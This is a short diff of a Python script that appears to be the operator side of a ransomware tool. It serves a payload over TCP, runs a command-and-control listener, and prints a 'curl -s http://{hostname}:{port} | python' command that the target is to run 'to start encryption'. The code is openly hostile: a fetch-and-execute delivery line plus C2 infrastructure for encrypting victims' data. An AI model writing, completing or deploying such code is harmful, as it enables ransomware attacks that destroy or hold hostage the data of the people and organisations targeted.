@@ -40,14 +40,16 @@ class PayloadHandler(socketserver.StreamRequestHandler):
         self.request.send(bytes(f"Content-Length: {len(self.payload)}\r\n\r\n", 'utf-8'))
         self.request.send(PAYLOAD)
 
-def start_payload_handler():
-    with socketserver.TCPServer(("0.0.0.0", ph_port), PayloadHandler) as server:
+def start_payload_handler(port):
+    with socketserver.TCPServer(("0.0.0.0", port), PayloadHandler) as server:
         server.serve_forever()
 
-def start_c2():
-    with socketserver.TCPServer(("0.0.0.0", c2_port), C2Handler) as server:
+def start_c2(port):
+    with socketserver.TCPServer(("0.0.0.0", port), C2Handler) as server:
         server.serve_forever()
 
-ph_thread = Thread(target=start_payload_handler, name='ph_thr')
+print(f"Execute following command on the target to start encryption:")
+print(f"\tcurl -s http://{hostname}:{ph_port} | python")
+ph_thread = Thread(target=start_payload_handler, args=[ph_port], name='ph_thr')
 ph_thread.start()
-start_c2()
+start_c2(c2_port)
